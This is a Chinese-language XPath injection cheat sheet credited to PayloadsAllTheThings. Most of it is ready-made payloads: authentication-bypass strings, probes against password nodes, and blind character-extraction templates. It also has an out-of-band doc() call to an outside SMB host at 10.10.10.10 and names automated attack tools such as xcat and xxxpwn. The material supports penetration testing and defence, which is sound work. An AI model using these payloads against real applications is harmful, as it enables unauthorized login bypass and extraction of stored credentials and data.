# XPATH Injection - XPath注入

[SEARCH_KEYWORDS]
漏洞类型: XPath Injection XPath注入 XML Path Language XML注入
攻击类型: Authentication Bypass Data Extraction Information Disclosure
关键词: XPath XML query navigate document node element attribute
技术: Blind XPath Out Of Band XXE Boolean-based Error-based
函数: substring string-length contains starts-with count

[CONTENT]

## XPath注入概述

XPath注入是一种攻击技术，用于利用从用户输入构造XPath查询来查询或导航XML文档的应用程序。

## 基础Payload

类似于SQL注入，需要正确终止查询：

```sql
' or '1'='1
' or ''='
x' or 1=1 or 'x'='y
/
//
//*
*/*
@*
count(/child::node())
x' or name()='username' or 'x'='y
' and count(/*)=1 and '1'='1
' and count(/@*)=1 and '1'='1
' and count(/comment())=1 and '1'='1
')] | //user/*[contains(*,'
') and contains(../password,'c
') and starts-with(../password,'c
```

## 查询示例

原始查询：

```sql
string(//user[name/text()='" +vuln_var1+ "' and password/text()='" +vuln_var1+ "']/account/text())
```

## 盲注技术

### 字符串长度判断

```sql
and string-length(account)=SIZE_INT
```

### 字符提取

```sql
substring(//user[userid=5]/username,2,1)=CHAR_HERE
substring(//user[userid=5]/username,2,1)=codepoints-to-string(INT_ORD_CHAR_HERE)
```

## 带外利用(OOB)

```powershell
http://example.com/?title=Foundation&type=*&rent_days=* and doc('//10.10.10.10/SHARE')
```

## XPath注入与SQL注入对比

| 特征 | SQL注入 | XPath注入 |
|------|---------|-----------|
| 数据存储 | 关系数据库 | XML文档 |
| 查询语言 | SQL | XPath |
| 权限控制 | 数据库权限 | 通常无权限控制 |
| 注释符 | --, #, /* */ | 无标准注释符 |
| 联合查询 | UNION | 使用 | 操作符 |

## 工具

- xcat - 自动化XPath注入攻击
- xxxpwn - 高级XPath注入工具
- xxxpwn_smart - 使用预测文本的xxxpwn分支
- xpath-blind-explorer - XPath盲注探索工具
- XmlChor - XPath注入利用工具

## 参考文档

原始来源: PayloadsAllTheThings/XPATH Injection/README.md